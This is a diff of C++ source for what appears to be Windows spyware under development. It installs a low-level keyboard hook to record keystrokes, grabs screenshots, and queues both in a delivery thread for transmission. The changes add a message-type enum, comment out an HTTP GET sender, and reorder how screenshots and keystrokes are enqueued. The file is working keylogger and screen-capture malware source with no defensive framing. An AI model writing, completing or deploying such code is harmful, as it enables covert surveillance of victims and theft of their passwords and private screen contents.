@@ -11,6 +11,8 @@
 
 
 
+enum messageTypes{keystrokes = 0, screenshot} mType;
+
 HHOOK hHook = NULL;
 bool capsLock = false;
 
@@ -83,7 +85,7 @@ void clearRecordedKeystrokes()
 
 
 
-void sendGetRequest(std::string url)
+/*void sendGetRequest(std::string url)
 {
     try
     {
@@ -106,7 +108,7 @@ void sendGetRequest(std::string url)
         std::cerr << "Request failed, error: " << e.what() << '\n';
     }
 
-}
+}*/
 
 
 std::vector<unsigned char> getScreenshot()
@@ -190,35 +192,26 @@ void deliveryThread(DataTransmission &dt,int interval_seconds)
     {
         Sleep(interval_seconds);
 
+        mType = screenshot;
 
 
+        saveToCapturedScreenshot(convertUnsignedCharVectorToString(getScreenshot()));
+        dt.Enqueue(mType,getCapturedScreenshot());
+
+
+        mType = keystrokes;
 
         const std::string s = getRecordedKeystrokes();
         if(s != "")
         {
-            dt.Enqueue(0,s);
+            dt.Enqueue(mType,s);
             clearRecordedKeystrokes();
         }
-
-        saveToCapturedScreenshot(convertUnsignedCharVectorToString(getScreenshot()));
-        dt.Enqueue(1,getCapturedScreenshot());
 
 
     }
 
 }
-
-/*void screenCaptureThread(DataTransmission &dt, int interval_seconds)
-{
-    interval_seconds *= 1000;
-    for(;;)
-    {
-        Sleep(interval_seconds);
-        saveToCapturedScreenshot(convertUnsignedCharVectorToString(getScreenshot());
-
-    }
-}*/
-
 
 
 
@@ -366,6 +359,11 @@ int main()
 
     std::string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
     lodepng::save_file(convertStringToUnsignedCharVector(base64_decode(screenB64)),"test.png");
+
+
+
+
+
     capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
     if (hHook == NULL)
